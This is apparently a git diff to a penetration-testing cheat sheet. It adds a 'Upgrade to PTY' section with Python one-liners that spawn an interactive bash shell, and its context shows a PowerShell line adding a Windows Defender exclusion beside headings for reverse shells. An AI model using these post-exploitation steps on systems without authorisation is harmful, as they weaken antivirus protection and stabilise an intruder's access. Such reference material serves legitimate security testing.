@@ -15,6 +15,7 @@ author_profile: true
   - [Create a shortcut lnk one-liner](#create-a-shortcut-lnk-one-liner)
   - [Create a Windows Defender exclusion](#create-a-windows-defender-exclusion)
 - [Shells](#shells)
+  - [Upgrade to PTY](#upgrade-to-pty)
   - [Bash](#bash)
   - [nc no e](#nc-no-e)
   - [Perl](#perl)
@@ -70,6 +71,15 @@ $Shortcut = (New-Object -comObject WScript.Shell).CreateShortcut("C:\users\<user
 Add-MpPreference -ExclusionPath "C:\users\lolcats\AppData\mysketchdir"
 ```
 ## Shells
+### Upgrade to PTY
+Python
+```
+python -c 'import pty;pty.spawn("/bin/bash");'
+```
+Python 3
+```
+python3 -c 'import pty;pty.spawn("/bin/bash");'
+```
 ### Bash
 Regular
 ```
